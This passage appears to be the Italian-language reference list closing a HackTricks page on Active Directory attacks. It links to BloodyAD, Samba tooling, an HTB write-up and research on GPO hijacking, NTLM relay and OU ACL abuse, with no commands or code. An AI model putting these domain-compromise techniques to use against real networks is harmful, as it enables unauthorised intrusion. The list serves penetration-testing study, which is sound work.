- [8] [BloodyAD – Operazioni sugli attributi AD/UAC da Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (appartenenza ai gruppi)](https://www.samba.org/)
- [10] [HTB Puppy: abuso di ACL AD, cracking di KeePassXC Argon2 e decrittazione DPAPI per ottenere l’accesso admin al DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: dirottamento dei percorsi UNC GPO per l’esecuzione di codice e il relay NTLM](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: sfruttamento delle GPO di Active Directory tramite relay NTLM e altro](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU che scherza? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: sfruttamento dei vettori di attacco ACL delle unità organizzative nascoste in Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulazione di servizi Active Directory legittimi sulla rete: il caso dello sfruttamento delle GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
